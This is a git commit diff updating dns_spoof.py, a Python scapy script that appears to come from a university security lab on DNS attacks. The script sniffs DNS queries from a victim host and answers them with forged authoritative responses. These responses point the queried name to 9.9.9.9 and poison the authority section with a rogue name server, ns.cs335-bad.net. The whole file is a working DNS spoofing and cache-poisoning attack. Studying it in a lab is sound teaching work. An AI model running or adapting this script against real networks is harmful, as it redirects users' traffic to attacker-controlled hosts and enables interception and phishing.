1ce18b8be6364dd5e0a3778b5ba07ab719937ada
gzhelezo <44788337+gzhelezo@users.noreply.github.com>
2021-03-15 22:00:33 -0400

    update dns spoof

--- code/dns/dns_spoof.py
+++ code/dns/dns_spoof.py
@@ -2,30 +2,44 @@
 from scapy.all import *
 
 def spoof_dns(pkt):
-    if(DNS in pkt and 'www.cs335.com' in pkt[DNS].qd.qname):
+    if(DNS in pkt and 'www.cs335.net' in pkt[DNS].qd.qname):
+
         # Swap the source and destination IP address
-        IPpkt = IP(dst=pkt[IP].src,src=pkt[IP].dst)
+        ip = IP(dst=pkt[IP].src,
+                src=pkt[IP].dst)
 
         # Swap the source and destination port number
-        UDPpkt = UDP(dport=pkt[UDP].sport, sport=53)
+        udp = UDP(  dport=pkt[UDP].sport,
+                    sport=pkt[UDP].dport)
 
         # The Answer Section
-        Anssec = DNSRR(rrname=pkt[DNS].qd.qname, type='A',
-                    rdata='1.2.3.4', ttl=199000)
+        ans = DNSRR(rrname=pkt[DNS].qd.qname,
+                    type='A',
+                    rdata='9.9.9.9',
+                    ttl=199000)
 
         # The Authority Section (bad)
-        NSsec  = DNSRR(rrname="cs335.com", type='NS',
-                    rdata='ns.cs335-bad.com', ttl=199000)
+        ns = DNSRR( rrname="cs335.net",
+                    type='NS',
+                    rdata='ns.cs335-bad.net',
+                    ttl=199000)
 
         # Construct the DNS packet
-        DNSpkt = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd,
-                  aa=1,rd=0,qdcount=1,qr=1,ancount=1,nscount=1,
-                  an=Anssec, ns=NSsec)
+        dns = DNS(  id=pkt[DNS].id,
+                    qd=pkt[DNS].qd,
+                    aa=1,       # Authoritative Answer Flag
+                    rd=0,       # Recursion Desired
+                    qdcount=1,  # Question Count
+                    qr=1,       # Query/Response Flag
+                    ancount=1,  # Answer Record Count
+                    nscount=1,  # Authority Record Count
+                    an=ans,     # Answer Record
+                    ns=ns)      # Authority Record
 
         # Construct the entire IP packet and send it out
-        spoofpkt = IPpkt/UDPpkt/DNSpkt
+        spoofpkt = ip/udp/dns
         send(spoofpkt)
 
         spoofpkt.show()
 
-pkt=sniff(filter='udp and (src host 10.0.2.4 and dst port 53)', prn=spoof_dns)
+pkt=sniff(filter='udp and (src host 10.0.2.12 and dst port 53)', prn=spoof_dns)
